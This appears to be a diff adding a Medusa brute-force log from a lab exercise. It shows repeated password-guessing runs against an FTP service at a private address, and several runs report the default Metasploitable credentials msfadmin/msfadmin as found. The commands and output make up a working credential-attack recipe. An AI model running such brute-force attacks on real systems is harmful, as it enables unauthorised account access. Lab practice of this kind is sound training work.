@@ -1,0 +1,49 @@
+# Medusa v.2.3 (2026-03-01 08:13:16)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 01:15:21)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 01:26:25)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 01:31:32)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 01:43:25)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 01:47:16)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -F -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 01:52:16)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -v 4 -F -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 02:00:00)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 07:22:16)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+2026-03-02 07:22:16 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 07:22:22).
+# Medusa v.2.3 (2026-03-02 07:50:40)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+2026-03-02 07:50:40 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 07:50:45).
+# Medusa v.2.3 (2026-03-02 07:59:08)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+2026-03-02 07:59:08 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 07:59:14).
+# Medusa v.2.3 (2026-03-02 08:04:09)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+2026-03-02 08:04:09 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:04:15).
+# Medusa v.2.3 (2026-03-02 08:10:01)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+2026-03-02 08:10:01 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:10:07).
+# Medusa v.2.3 (2026-03-02 08:15:46)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -T 3 -F -v 4 -O log_ftp.txt 
+2026-03-02 08:15:46 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:15:52).
+# Medusa v.2.3 (2026-03-02 08:18:04)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+# Medusa v.2.3 (2026-03-02 08:20:46)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -v 4 -O log_ftp.txt 
+2026-03-02 08:20:58 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa v.2.3 (2026-03-02 08:26:52)
+# medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -F -v 4 -O log_ftp.txt 
+2026-03-02 08:27:04 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+# Medusa has finished (2026-03-02 08:27:04).
